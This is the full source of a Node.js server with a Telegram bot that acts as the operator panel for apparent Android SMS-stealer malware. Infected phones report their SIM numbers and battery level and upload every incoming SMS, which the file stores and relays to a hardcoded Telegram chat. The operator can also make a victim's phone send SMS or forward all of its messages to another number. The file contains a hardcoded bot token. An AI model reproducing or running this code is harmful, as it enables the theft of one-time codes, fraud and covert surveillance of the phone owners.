const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = '8197634171:AAEECSJXo6RkixQiS2kpYLbV0RiK3w2hXkA';
const ADMIN_IDS = [-1003002765398]; // Replace with group/chat ID
const PORT = 3000;
const DEVELOPER = '@ydkhgmmt';
const STATUS_INTERVAL = 60 * 1000; // 1 min refresh

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== APP =====
const app = express();
app.use(bodyParser.json());

// ===== BOT =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== RUNTIME =====
const devices = new Map();
const sessions = {};
const notifiedDevices = new Set();
let lastStatusMessageId = null;

// ===== UTILS =====
function readQueue() { return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {}; }
function writeQueue(q) { fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 }); }
function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}
function isAdmin(chatId) { return ADMIN_IDS.includes(chatId); }
function formatDevice(d) {
  const online = (Date.now() - (d.lastSeen || 0) < 60000);
  return `📱 *${d.model || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'} | 🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 ${d.battery || 'N/A'}%\n🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
}

// ===== EXPRESS ROUTES =====
app.post('/connect', (req, res) => {
  const { uuid, model, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });

  if (!notifiedDevices.has(uuid)) {
    ADMIN_IDS.forEach(id =>
      bot.sendMessage(id, `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}`, { parse_mode: 'Markdown' })
    );
    notifiedDevices.add(uuid);
  }
  res.sendStatus(200);
});

app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('missing uuid');
  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('missing fields');

  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = new Date(timestamp || Date.now());

  // Save SMS
  const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
  const list = fs.existsSync(smsFile) ? fs.readJsonSync(smsFile) : [];
  list.unshift({ from, body, sim, battery, timestamp: ts.getTime() });
  fs.writeJsonSync(smsFile, list.slice(0, 500), { spaces: 2 });

  // Notify admin
  const smsMsg = `📱 *NEW SMS* (${device.model})\nFrom: ${from}\nSIM: ${sim}\nTime: ${ts.toLocaleTimeString()}\nMessage:\n${body}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMsg, { parse_mode: 'Markdown' }));
  res.sendStatus(200);
});

// ===== TELEGRAM HANDLER =====
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (!isAdmin(chatId)) return bot.sendMessage(chatId, '❌ Permission denied.');

  const s = sessions[chatId];
  if (s?.stage) {
    if (s.stage === 'await_sms_number') {
      s.number = text;
      s.stage = 'await_sms_body';
      return bot.sendMessage(chatId, '✍️ Enter SMS message text:');
    }
    if (s.stage === 'await_sms_body') {
      addCommand(s.uuid, { type: 'send_sms', sim: s.sim, number: s.number, message: text });
      bot.sendMessage(chatId, `✅ SMS SENT\nDevice: ${devices.get(s.uuid)?.model}\nSIM${s.sim} → ${s.number}\n✉️ Message: ${text}`);
      delete sessions[chatId];
      return;
    }
    if (s.stage === 'await_forward_number') {
      addCommand(s.uuid, { type: 'sms_forward', action: 'on', sim: s.sim, number: text });
      bot.sendMessage(chatId, `✅ SMS Forward enabled for SIM${s.sim} → ${text}`);
      delete sessions[chatId];
      return;
    }
  }

  if (text === '/start') {
    return bot.sendMessage(chatId, '✅ Admin Panel Ready', {
      reply_markup: { keyboard: [['Connected devices']], resize_keyboard: true }
    });
  }

  if (text === 'Connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model, callback_data: `device_menu:${uuid}` }]);
    return bot.sendMessage(chatId, '📱 Select a device:', { reply_markup: { inline_keyboard: rows } });
  }
});

// ===== CALLBACKS =====
bot.on('callback_query', cb => {
  const chatId = cb.message.chat.id;
  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });

  const [cmd, uuid] = cb.data.split(':');
  const device = devices.get(uuid);

  if (!device) return bot.answerCallbackQuery(cb.id, { text: '❌ Device not found' });

  switch (cmd) {
    case 'device_menu':
      return bot.editMessageText(`📱 *${device.model}* Selected\nChoose an action:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📤 Send SMS', callback_data: `send_sms:${uuid}` }],
            [{ text: '📥 Receive SMS', callback_data: `receive_sms:${uuid}` }],
            [{ text: '📡 SMS Forward', callback_data: `forward_menu:${uuid}` }]
          ]
        }
      });

    case 'send_sms':
      return bot.editMessageText(`Choose SIM for ${device.model}:`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[
          { text: 'SIM1', callback_data: `send_sms_sim1:${uuid}` },
          { text: 'SIM2', callback_data: `send_sms_sim2:${uuid}` }
        ]] }
      });

    case 'send_sms_sim1':
    case 'send_sms_sim2':
      sessions[chatId] = { stage: 'await_sms_number', sim: cmd.includes('sim2') ? 2 : 1, uuid };
      bot.sendMessage(chatId, '📞 Enter recipient number:');
      return bot.answerCallbackQuery(cb.id);

    case 'receive_sms':
      const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
      if (!fs.existsSync(smsFile)) return bot.sendMessage(chatId, '🚫 No SMS history.');
      const list = fs.readJsonSync(smsFile).slice(0, 20);
      let out = `📜 *Last 20 SMS for ${device.model}*\n`;
      list.forEach(sms => {
        const ts = new Date(sms.timestamp);
        out += `\nFrom: ${sms.from}\nMessage: ${sms.body}\nSIM: ${sms.sim}\nTime: ${ts.toLocaleString()}\n---------------------\n`;
      });
      return bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });

    case 'forward_menu':
      return bot.editMessageText(`Choose SIM for forward (${device.model}):`, {
        chat_id: chatId,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[
          { text: 'SIM1', callback_data: `forward_sim1:${uuid}` },
          { text: 'SIM2', callback_data: `forward_sim2:${uuid}` }
        ]] }
      });

    case 'forward_sim1':
    case 'forward_sim2':
      sessions[chatId] = { stage: 'await_forward_number', sim: cmd.includes('sim2') ? 2 : 1, uuid };
      bot.sendMessage(chatId, `📡 Enter number to forward SMS (SIM${sessions[chatId].sim}):`);
      return bot.answerCallbackQuery(cb.id);

    default:
      return bot.answerCallbackQuery(cb.id, { text: '❌ Unknown action' });
  }
});

// ===== AUTO STATUS REFRESH =====
setInterval(async () => {
  if (devices.size === 0) return;
  let statusText = '📡 *Device Status Update*\n\n';
  for (let [uuid, d] of devices.entries()) statusText += `${formatDevice(d)}\nUUID: \`${uuid}\`\n\n`;
  for (let id of ADMIN_IDS) {
    try {
      if (lastStatusMessageId) {
        await bot.editMessageText(statusText, { chat_id: id, message_id: lastStatusMessageId, parse_mode: 'Markdown' });
      } else {
        const sent = await bot.sendMessage(id, statusText, { parse_mode: 'Markdown' });
        lastStatusMessageId = sent.message_id;
      }
    } catch (e) {
      lastStatusMessageId = null;
    }
  }
}, STATUS_INTERVAL);

// ===== START SERVER =====
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
bot.getMe().then(info => console.log(`🤖 Bot started as @${info.username}`)).catch(e => console.error(e));
